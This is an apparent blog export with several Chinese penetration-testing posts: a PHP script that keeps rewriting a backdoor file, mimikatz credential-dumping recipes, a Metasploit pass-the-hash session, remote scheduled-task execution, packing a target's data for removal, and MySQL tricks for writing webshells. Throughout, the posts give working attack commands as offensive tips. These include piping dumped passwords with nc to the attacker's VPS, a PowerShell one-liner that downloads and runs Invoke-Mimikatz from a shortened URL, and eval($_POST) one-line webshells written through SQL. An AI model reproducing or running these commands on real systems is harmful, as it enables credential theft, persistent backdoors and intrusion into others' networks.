      </categories>
      <tags>
        <tag>tools</tag>
        <tag>内网</tag>
        <tag>系统安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP 定时任务]]></title>
    <url>%2F2017%2F05%2FPHP-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[写一个关于不死进程,其实也就是定时的进程，时间短那就是无限的启用着。之前有些文章也有这一些函数，但是没有备注。 ignore_user_abort() 函数属于杂项函数。ignore_user_abort()函数设置与客户机断开是否会终止脚本的执行。 语法1ignore_user_abort(setting) setting为可选项,如果设置为 true，则忽略与用户的断开，如果设置为 false，会导致脚本停止运行。如果未设置该参数，会返回当前的设置。 注释PHP 不会检测到用户是否已断开连接，直到尝试向客户机发送信息为止。 set_time_limit() 函数在PHP4，PHP5和PHP7中set_time_limit 是设置脚本最大执行时间 语法1bool set_time_limit ( int $seconds ) seconds最大的执行时间，单位为秒，默认值为30秒。如果设置为0（零），没有时间方面的限制。 file_put_contents() 函数属于Filesystem 函数，这个允许访问和操作文件系统。 file_put_contents() 函数把一个字符串写入文件中。与依次调用 fopen()，fwrite() 以及 fclose() 功能一样。 语法1file_put_contents(file,data,mode,context) file为必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。data为可选。规定要写入文件的数据。可以是字符串、数组或数据流。mode为可选。规定如何打开/写入文件。context为可选。规定文件句柄的环境。 usleep() 函数usleep() 函数为杂项函数，作用为延迟代码执行若干微秒。 语法1usleep(microseconds) microseconds是必需填写的。以微秒计的暂停时间。 运用demo.php内容为：12345678910111213141516&lt;?phpignore_user_abort(true);set_time_limit(0);$file = &apos;demo.php&apos;;$shell = &quot;&lt;?php phpinfo();?&gt;&quot;; while (TRUE) &#123; file_put_contents($file, $shell);system(&apos;chmod 777 demo.php&apos;);usleep(50);&#125;?&gt; 这种小技巧在留后门上还是有些用的，种了多个demo.php，就可以批量获取demo.php界面内容。123456789101112&lt;?php$array = array( &quot;192.168.xxx.xxx&quot;, &quot;192.168.xxx.xxx&quot;);for($i=0;$i&lt;=1;$i++)&#123;$url = &quot;http://$array[$i]/demo.php&quot;;$contents = file_get_contents($url); echo &quot;$array[$i] &lt;br&gt;&quot;;echo &quot;$contents &lt;br&gt;&lt;br&gt;&quot;;&#125; ?&gt;]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mimikatz使用技巧]]></title>
    <url>%2F2017%2F03%2Fmimikatz%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[mimikatz平时一般使用技巧 非交换式打印（输出）mimikatz执行过程的log1mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;log sekurlsa::logonpasswords full&quot;&quot; exit &amp;&amp; dir 读取的密码导出在mimikatz的目录，然后用webshell 将log文件copy到web下，在线访问1mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit &gt;&gt; log.txt nc到vps非交互抓明文,不留任何文件,直接把抓取结果用nc发到指定的远程机器(一般是自己的vps)上,可能有些端口出不来,换几个常用的即可,80,8080,443,53……12mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit | nc -vv 192.168.3.251 1234 在目标机器上执行nc -lvp 1234 本地(vps上)机器执行 两种免杀方式使用powershell1powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://is.gd/oeoFuI&apos;); Invoke-Mimikatz -DumpCreds&quot; Tips：powershell 默认windows visa后才有。也可以将结果发送到vps上。 procdump lsass 进程导出12C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp //For 32 bitsC:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp //For 64 bits 本地使用mimikatz还原123mimikatz.exesekurlsa::minidump lsass.dmpsekurlsa::logonPasswords full 获取vpn密码1mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit 浏览器密码12mimikatz.exe privilege::debug log &quot;dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\cookies /unprotect&quot; exitmimikatz.exe privilege::debug log &quot;dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\LOGIND~1&quot; exit //读chrome密码]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网必修-hash传递-ipc$]]></title>
    <url>%2F2017%2F03%2F%E5%86%85%E7%BD%91%E5%BF%85%E4%BF%AE-hash%E4%BC%A0%E9%80%92-ipc%24%2F</url>
    <content type="text"><![CDATA[这些是刚接触内网的时候了解到的，之前的blog也是写有的。 hsah传递详细原理就看这里：刨根问底：Hash传递攻击原理探究 测试环境：（本机） 目标机:Windows 7 Ultimate 192.168.1.106 攻击机:Linux 4.6.0-kali1-amd64 192.168.1.107 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465msf &gt; use exploit/windows/smb/psexecmsf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(psexec) &gt; set LHOST 192.168.1.107LHOST =&gt; 192.168.1.107msf exploit(psexec) &gt; set LPORT 1024LPORT =&gt; 1024msf exploit(psexec) &gt; show optionsModule options (exploit/windows/smb/psexec): Name Current Setting Required Description ---- --------------- -------- ----------- RHOST yes The target address RPORT 445 yes The SMB service port (TCP) SERVICE_DESCRIPTION no Service description to to be used on target for pretty listing SERVICE_DISPLAY_NAME no The service display name SERVICE_NAME no The service name SHARE ADMIN$ yes The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share SMBDomain . no The Windows domain to use for authentication SMBPass no The password for the specified username SMBUser no The username to authenticate asPayload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: &apos;&apos;, seh, thread, process, none) LHOST 192.168.1.107 yes The listen address LPORT 1024 yes The listen portExploit target: Id Name -- ---- 0 Automaticmsf exploit(psexec) &gt; set RHOST 192.168.1.106RHOST =&gt; 192.168.1.106msf exploit(psexec) &gt; set smbuser rcoilsmbuser =&gt; rcoilmsf exploit(psexec) &gt; set smbpass aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4smbpass =&gt; aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4msf exploit(psexec) &gt; exploit [*] Started reverse TCP handler on 192.168.1.107:1024 [*] 192.168.1.106:445 - Connecting to the server...[*] 192.168.1.106:445 - Authenticating to 192.168.1.106:445 as user &apos;rcoil&apos;...[*] 192.168.1.106:445 - Selecting PowerShell target[*] 192.168.1.106:445 - Executing the payload...[+] 192.168.1.106:445 - Service start timed out, OK if running a command or non-service executable...[*] Sending stage (957487 bytes) to 192.168.1.106[*] Meterpreter session 1 opened (192.168.1.107:1024 -&gt; 192.168.1.106:50209) at 2017-03-02 06:20:15 +0800meterpreter &gt; shellProcess 3460 created.Channel 1 created.Microsoft Windows [�汾 6.1.7600]��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����C:\Windows\system32&gt;whoami whoamint authority\system ipc$内网渗透里面不管域还是工作组最先需要介绍的就是ipc连接，这个是内网渗透必修科目，后面绝大多数操作都要基于ipc连接。 ipc$的作用利用IPC$,连接者甚至可以与目标主机建立一个连接，利用这个连接，连接者可以得到目标主机上的目录结构、用户列表等信息。dir、copy、xcopy、move、type等参数都可以使用UNC路径(何为UNC路径？简单来讲以\开头的路径就是UNC路径)。 计划任务说到ipc$，最多的就会提到at和schtasks12345678910111213141516171819202122232425262728C:\Users\John\Desktop&gt;md \\192.168.1.67\c$\users\public\base\C:\Users\John\Desktop&gt;copy base.exe \\192.168.1.67\c$\users\public\base\ 1 file(s) copied.C:\Users\John\Desktop&gt;copy bat.bat \\192.168.1.67\c$\users\public\base\ 1 file(s) copied.C:\Users\John\Desktop&gt;dir \\192.168.1.67\c$\users\public\base\ Volume in drive \\192.168.1.67\c$ is Windows 7 Volume Serial Number is 44F3-57F8 Directory of \\192.168.1.67\c$\users\public\base08/30/2017 02:35 AM &lt;DIR&gt; .08/30/2017 02:35 AM &lt;DIR&gt; ..08/11/2013 12:40 AM 43,520 base.exe08/30/2017 02:32 AM 32 bat.bat 2 File(s) 43,552 bytes 2 Dir(s) 55,193,870,336 bytes freeC:\Users\John\Desktop&gt;at \\192.168.1.67 4:40 c:\users\public\base\bat.batdded a new job with job ID = 1...删除at任务at /delete /y schtasks是at的升级版。123schtasks /create /tn &quot;base&quot; /tr c:\users\public\base\base.bat /sc once /st 4:50 /S 192.168.1.67 /RU System /u admin /p &quot;1&quot;schtasks /run /tn &quot;base&quot; /S 192.168.1.67 /u admin /p &quot;1&quot; /i #立即执行schtasks /F /delete /tn &quot;base&quot; /S 192.168.1.67 /u admin /p &quot;1&quot; /create表示创建计划任务，/tn表示任务名，/tr指定运行的文件，/sc是任务运行频率，/st是执行时间，/s指定远程机器名或ip地址，/ru指定运行任务的用户权限，这里指定为最高的SYSTEM，/i表示立即运行，/F表示如果指定的任务已经存在，则强制创建任务并抑制警告，/delete是删除任务。]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用目标系统现有工具快速打包目标机器数据]]></title>
    <url>%2F2017%2F03%2F%E5%88%A9%E7%94%A8%E7%9B%AE%E6%A0%87%E7%B3%BB%E7%BB%9F%E7%8E%B0%E6%9C%89%E5%B7%A5%E5%85%B7%E5%BF%AB%E9%80%9F%E6%89%93%E5%8C%85%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E6%95%B0%E6%8D%AE%2F</url>
    <content type="text"><![CDATA[几乎对所有渗透者来讲,初衷或者最终目的无非就是想对目标实施长期监控及数据落地。 在linux机器下的快速打包方式:利用 ‘tar’一般在部署系统时默认都会预先装上,其它还有很多其它的压缩工具,但这里就以最常用的为例。12345678--exclude 排除不打包的文件-c 创建文件-v 显示打包过程-f 指定要打包的文件-z 压缩-X 把要排除的文件名事先写到文件中然后指定它就可以排除多个了-C 解压到指定目录中-p 打包的时候保持原有文件属性 以 gunzip 格式压缩解压:123# find / -name &apos;*.php&apos; -type f | wc -l# tar zcf /tmp/phpfile.tar.gz `find / -name &apos;*.php&apos; -type f` 2&gt; /dev/null &amp;&amp; cd /tmp &amp;&amp; ls ./phpfile.tar.gz &amp;&amp; echo $? &amp;&amp; tar tf phpfile.tar.gz | wc -l 会带上原有的目录结构# tar xf phpfile.tar.gz -C ./ 解压 以 bzip 格式压缩解压:12# tar jcf access.tar.bz access* bzip格式打包压缩文件# tar jxf access.tar.bz zip解压缩 针对大文件的分卷压缩解压:123# tar cjf - /usr/local/apache2/htdocs/ | split -b 1m - www.bz2 2&gt;/dev/null 1m大小分割,直接压缩到当前目录下# cat www.bz2a* | tar xj 分割压缩后的解压方法# ls -lR usr/ 在win机器上的一些快速打包方式7z12345-r 递归压缩-o 指定要输出到的目录-p 指定密码-v 分卷压缩,给的务必要适量,否则文件会非常多a 添加压缩文件 普通压缩解压方式12# 7z.exe -r -padmin a c:\drupal754.7z C:\AppServ\www\drupal-7.54-vuln-sqli-rce\*.*# 7z.exe x -padmin drupal754.7z -oc:\xl 分卷压缩解压方式12# 7z.exe -r -v1m -padmin a c:\drupal754.7z C:\AppServ\www\drupal-7.54-vuln-sqli-rce\*.*# 7z.exe x -padmin drupal754.7z.001 -oc:\xl rar把安装好的winrar安装目录的rar.exe提取出来就可以直接用了,前提是你安装winrar的系统和目标的系统版本要对应,不然可能有些问题(自己觉得库应该是兼容的)123456-a 添加要压缩的文件-p 指定压缩密码-r 递归压缩,默认只压根目录,需要先注册下,把rarreg.key丢到安装winrar目录即可-x 指定要排除的文件,单位 k,m,g-v 分卷打包,后面跟上单位就好了,打包大文件会很有用-m3,4 使用较好的压缩方式,速度可能会有些慢 以 rar 格式压缩解压12# Rar.exe a -r -padmin -m3 -x*.txt -ta c:\drupal754.rar C:\AppServ\www\drupal-7.54-vuln-sqli-rce\*.* 把指定目录下的所有文件[包括所有子目录及子目录中的文件,排除txt文件]带密码压缩,然后把压缩好的文件放到c的根下命名成drupal754.rar# Rar.exe x -padmin c:\drupal754.rar c:\xl 带密码保留原有目录结构解压 以 zip 格式压缩解压[用法同上]12# Rar.exe a -r -padmin -m3 -x*.txt -ta c:\drupal754.zip C:\AppServ\www\drupal-7.54-vuln-sqli-rce\*.*# Rar.exe x -padmin c:\drupal754.zip c:\xl 分卷压缩解压12# Rar.exe a -r -v1m -padmin -m3 -x*.txt -ta c:\drupal754.rar C:\AppServ\www\drupal-7.54-vuln-sqli-rce\*.* 压缩# Rar.exe x -padmin c:\drupal754.part01.rar c:\xl 解压 后话:很显然,通关全文,跟技术几乎没有任何关系[仅仅就是几个小工具的简单使用而已],就当留个备忘吧,留给有需要的朋友,另外,打包的时候务必注意下目标分区的大小,不然空间不够,容易出错,文件的元数据要不要一并保存,正在打包的文件是否被占用什么的,有时候打包可能还会有些小小的问题,相信那对你都不是问题]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>内网</tag>
        <tag>系统安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL问题]]></title>
    <url>%2F2016%2F09%2FMySQL%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[渗透测试中遇到一些MySQL问题 常用操作语句用户管理 新建用户： CREATE USER name IDENTIFIED BY ‘ssapdrow’; 更改密码： SET PASSWORD FOR name=PASSWORD(‘fdddfd’); 权限管理 SHOW GRANTS FOR name; //查看name用户权限GRANT SELECT ON db_name. TO name; //给name用户db_name数据库的所有权限REVOKE SELECT ON db_name. TO name; //GRANT的反操作，去除权限； 数据库操作 查看数据库： SHOW DATABASES; 创建数据库： CREATE DATABASE db_name; //db_name为数据库名 使用数据库： USE db_name; 删除数据库： DROP DATABASE db_name; 创建表 创建表：1234567CREATE TABLE table_name(id TINYINT UNSIGNED NOT NULL AUTO_INCREMENT, //id值，无符号、非空、递增——唯一性，可做主键。name VARCHAR(60) NOT NULLscore TINYINT UNSIGNED NOT NULL DEFAULT 0, //设置默认列值PRIMARY KEY(id))ENGINE=InnoDB //设置表的存储引擎，一般常用InnoDB和MyISAM；InnoDB可靠，支持事务；MyISAM高效不支持全文检索DEFAULT charset=utf8; //设置默认的编码，防止数据库中文乱码 如果有条件的创建数据表还可以使用 &gt;CREATE TABLE IF NOT EXISTS tb_name(…….. 复制表： CREATE TABLE tb_name2 SELECT * FROM tb_name;或者部分复制：CREATE TABLE tb_name2 SELECT id,name FROM tb_name; 创建临时表： CREATE TEMPORARY TABLE tb_name(这里和创建普通表一样); 查看数据库中可用的表： SHOW TABLES; 查看表的结构： DESCRIBE tb_name;也可以使用：SHOW COLUMNS in tb_name; //from也可以 删除表： DROP [ TEMPORARY ] TABLE [ IF EXISTS ] tb_name[ ,tb_name2…….];实例：DROP TABLE IF EXISTS tb_name; 表重命名： RENAME TABLE name_old TO name_new;还可以使用：ALTER TABLE name_old RENAME name_new; 插入数据 插入数据： INSERT INTO tb_name(id,name,score)VALUES(NULL,’张三’,140),(NULL,’张四’,178),(NULL,’张五’,134);这里的插入多条数据直接在后边加上逗号，直接写入插入的数据即可；主键id是自增的列，可以不用写。 插入检索出来的数据： INSERT INTO tb_name(name,score) SELECT name,score FROM tb_name2; 更新数据 指定更新数据： UPDATE tb_name SET score=189 WHERE id=2;UPDATE tablename SET columnName=NewValue [ WHERE condition ] 更新数据 指定更新数据： UPDATE tb_name SET score=189 WHERE id=2;UPDATE tablename SET columnName=NewValue [ WHERE condition ] MySQL外连 改表 vps上的MySQL不允许远程登陆，只能在127.0.0.1。这个时候只要在vps上，登入MySQL后，更改 MySQL数据库里的 user表里的 host 项，从localhost改称% 或添加一个用户为%。1234mysql -u root -pmysql&gt;use mysql;mysql&gt;update user set host = &apos;%&apos; where user = &apos;root&apos;;mysql&gt;select host, user from user; 授权 在MySQL服务器上MySQL命令行执行以下命令：12grant all privileges on *.* to root@&quot;%&quot; identified by &apos;rcoil&apos; with grant option; flush privileges; 其中上面两行代码的意思是给从任意ip地址连接的用户名为root，密码为abc的用户赋予所有的权限。其中的”%”为任意的ip地址，如果想设为特定的值也可以设定为特定的值。 利用 Navicat 自带的http隧道链接 我这里是本地做的测试。 就可以链接了。方便你我他。 MySQL数据截断问题之前在做ISCC的最后一道Web题上遇到的问题，但是一直忘了记录下来。 对于很多web应用文件在很多功能是不容许重复数据的，比如用户注册功能等。先判断注册时的username与数据库里已存在的username是否数据重复，如果出现重复，我们可以用数据的超长截断来绕过这些判断，从而导致更新密码的作用（一个username多个passwd）。 原理： 比如一个表的结构是这样的：1create table admin(username varchar(10) not null,passwd varchar(10) not null); 可以看到username跟passwd的字节为10 但是这my.ini设置成sql-mode=”NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION”的话就算超出也会添加成功 mysql的 sql_mode设置为default的时候，即没有开启STRICT_ALL_TABLES选项时，MySQL对于插入超长的值只会提示 warning，而不是error，这样可能会导致一些截断问题。 123456789mysql&gt; insert into RcoIl(`username`,`passwd`) values(&quot;admin x&quot;, &quot;111&quot;)mysql&gt; select * from RcoIl;+----+-----------------+--------------+| id | username | passwd |+----+-----------------+--------------+| 1 | admin | 11 || 2 | admin | 111 |+----+-----------------+--------------+ 出现了两个admin的记录。 从而我们可以用另外的密码去登录admin账户 MySQL的读写 读文件 常见的读文件，可以用16进制代替字符串1234selectload_file(&apos;c:/boot.ini&apos;)selectload_file(0x633a2f626f6f742e696e69)selectload_file(&apos;//ecma.io/1.txt&apos;) # smb协议selectload_file(&apos;\\\\ecma.io\\1.txt&apos;) # 可用于DNS隧道 写文件已知唯一的写文件的方式 1select 0x313233 intooutfile &apos;D:/1.txt&apos; root权限写shell方法 union 1id=2) union select 1,2,3,4,5,6,7,&apos;&lt;? phpinfo(); ?&gt;’ into outfile ‘/home/wwwroot/lu4n.com/luan_phpinfo.php’# no union 1id=2) into outfile ‘/home/wwwroot/demo/phpinfo.php’ fields terminated by ‘&lt;? phpinfo(); ?&gt;’# 无outfile权限时写shell方法outfile被禁止，或者写入文件被拦截，root权限，在数据库中操作如下:1234show variables like &apos;%general%&apos;; // 查看mysql日志路径set global general_log=on; //开启日志set global general_log_file=&apos;xxx路径/1.php&apos;; //设置目录日志为shell地址select &apos;&lt;?php eval($_POST[cmd]);?&gt;&apos; //随意执行一条mysql语句让其写入一句话到1.php文件里 os-shell查找绝对路径及写入前端随便查看某图片名字或者上传查看路径linux系统： 使用pwd查看当前路径逐层使用ls查找（如uploads）路径写入一句话os-shell&gt;echo \&lt;\php\ \@eval\(\$\_POST\[rcoil\]\)\;\?\&gt; &gt;/uploads/rcoil.php tips：当无法执行命令或者权限低时，可以使用/sbin/如：##/sbin/ifconfig windows系统： 在前端找到一张图片，查看图片名：rcoil.jpg使用dir /s /b d:\rcoil.jpg,就能查找rcoil.jpg的路径写入一句话os-shell&gt;echo ^&lt;%eval request(chr(123))%^&gt; &gt;&gt;d:\web\1.txt 当路径为中文名，没找到好方法。]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
</search>
